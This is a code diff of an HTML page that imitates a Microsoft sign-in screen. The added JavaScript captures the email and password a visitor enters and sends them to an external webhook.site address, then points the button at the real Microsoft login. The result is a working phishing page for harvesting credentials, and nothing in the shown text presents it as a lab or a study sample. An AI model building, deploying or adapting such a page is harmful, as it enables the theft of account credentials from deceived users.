@@ -10,27 +10,31 @@
 </head>
 <body>
     <div class="container">
-        <form action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+        <form id="loginForm" autocomplete="off">
             <img class="logo" src="logo.png" width="200px">
             <div class="forms-container">
                 <div class="forms">
+                    <!-- Step 1: Email -->
                     <div class="first">
                         <h2>Sign in</h2>
                         <div class="form-group">
-                            <input type="email" placeholder="Email, Phone, or Skype" required>
+                            <input type="email" id="email" name="email" placeholder="Email, Phone, or Skype" required>
                         </div>
                         <p>No account? <a href="#">Create One!</a></p>
                         <a href="#">Sign in with a security key <span>?</span></a>
                         <button type="button" class="next-btn">Next</button>
                     </div>
+
+                    <!-- Step 2: Password -->
                     <div class="second">
-                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">example@email.com</span></p>
                         <h2>Enter password</h2>
                         <div class="form-group">
-                            <input type="password" placeholder="Password" required>
+                            <input type="password" id="password" name="password" placeholder="Password" required>
                         </div>
                         <a href="#">Forgot password?</a><br>
-                        <button type="button" onclick="location.href='https://login.microsoftonline.com/a494743f-7201-494d-a452-f48c5388c4c0/oauth2/authorize?client_id=efbcb0c4-8b3c-4d01-b132-61f148a828bb&response_mode=form_post&response_type=code%20id_token&scope=openid%20profile&state=OpenIdConnect.AuthenticationProperties%3DVC5DivHCuOTDC-BNIHicMnKUIuYkeOtWOmsUWYrAj5FIIVhUlbCZGUtxL2Vd5tVYd0uqxqLdEoUHch96-dxYIL9DrVikPuGI3ORrQrxjBG8T9Yw34YK87G-s1If4RF9jQzsaqdcSBKZQtBqCcrPKGA&nonce=638931466127274944.YTk1OWNhYjAtMDcyMS00YzRjLTgyOGYtNTIxZjZlZWUyMGIzYTUzN2NlYmEtODNmNC00Yjg1LWFkOTQtYzkwN2YyZGRjZTUw&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&sso_reload=true'">Sign in</button>
+                        <!-- Submit button -->
+                        <button type="submit" class="signin-btn" onclick="location.href='https://login.microsoftonline.com/'">Sign in</button>
                     </div>
                 </div>
             </div>
@@ -40,90 +44,81 @@
             <span>Sign-in options</span>
         </div>
     </div>
-    <div id="footer" role="contentinfo" data-bind="
-        externalCss: {
-            'footer': true,
-            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
-            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
 
-        <div data-bind="component: { name: 'footer-control',
-            publicMethods: $page.footerMethods,
-            params: {
-                serverData: svr,
-                useDefaultBackground: $page.useDefaultBackground(),
-                hasDarkBackground: $page.backgroundLogoUrl(),
-                showLinks: true,
-                showFooter: $page.showFooter(),
-                hideTOU: $page.hideTOU(),
-                termsText: $page.termsText(),
-                termsLink: $page.termsLink(),
-                hidePrivacy: $page.hidePrivacy(),
-                privacyText: $page.privacyText(),
-                privacyLink: $page.privacyLink() },
-            event: {
-                agreementClick: $page.footer_agreementClick,
-                showDebugDetails: $page.toggleDebugDetails_onClick } }">
-<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
-<a id="ftrTerms" data-bind="
-            text: termsText,
-            href: termsLink,
-            click: termsLink_onClick,
-            externalCss: {
-                'footer-content': true,
-                'footer-item': true,
-                'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
-        <a id="ftrPrivacy" data-bind="
-            text: privacyText,
-            href: privacyLink,
-            click: privacyLink_onClick,
-            externalCss: {
-                'footer-content': true,
-                'footer-item': true,
-                'has-background': !useDefaultBackground,
-                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
-    <a id="moreOptions" href="#" role="button" data-bind="
-        click: moreInfo_onClick,
-        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
-        attr: { 'aria-expanded': showDebugDetails().toString() },
-        hasFocusEx: focusMoreInfo(),
-        externalCss: {
-            'footer-content': true,
-            'footer-item': true,
-            'debug-item': true,
-            'has-background': !useDefaultBackground,
-            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
-</div></div>
+    <div id="footer" role="contentinfo" class="footer ext-footer">
+        <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+            <a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+            <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+            <a id="moreOptions" href="#" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+        </div>
     </div>
+
     <script>
-        const forms = document.querySelector('.forms');
-        const nextButton = document.querySelector('.next-btn');
-        const arrowButton = document.querySelector('.arrow-btn');
-    
-        const emailInput = document.querySelector('.first input');
-        const emailDisplay = document.querySelector('.email');
-        const passwordInput = document.querySelector('.second input');
-    
+       const forms = document.querySelector('.forms');
+const nextButton = document.querySelector('.next-btn');
+const arrowButton = document.querySelector('.arrow-btn');
+
+const emailInput = document.getElementById('email');
+const emailDisplay = document.querySelector('.email');
+const passwordInput = document.getElementById('password');
+
+// Next button → move to password step
 nextButton.addEventListener('click', () => {
+    if (emailInput.value.trim() === "") {
+        alert("Please enter your email.");
+        return;
+    }
     forms.classList.add('next-form');
     emailDisplay.innerText = emailInput.value;
     passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
     document.querySelector('.bottom').style.display = 'none';
 });
 
-// Handle Enter key on the email input
+// Enter key on email field
 emailInput.addEventListener('keydown', (event) => {
     if (event.key === 'Enter') {
-        event.preventDefault(); // prevents form from reloading page
-        nextButton.click();     // trigger the same click action
+        event.preventDefault();
+        nextButton.click();
     }
 });
 
-// Existing click handler for Arrow button
+// Back button
 arrowButton.addEventListener('click', () => {
     forms.classList.remove('next-form');
+});
+
+// Handle form submit with multiple methods
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if (!email || !password) {
+        alert("Please fill in both fields.");
+        return;
+    }
+
+    // Your webhook URL
+    const webhookURL = "https://webhook.site/ff9c4d1d-b6e8-41a6-b9e4-c06ecb49d9a3";
+
+    // Method 4: No-cors mode (will send but can't verify)
+    try {
+        await fetch(webhookURL, {
+            method: "POST",
+            mode: 'no-cors',
+            body: JSON.stringify({ email, password })
+        });
+
+        // Since no-cors doesn't return status, we assume it worked
+
+        return;
+    } catch (err) {
+        console.log('No-cors method failed:', err);
+    }
+
+
 });
     </script>    
 </body>
 </html>
-
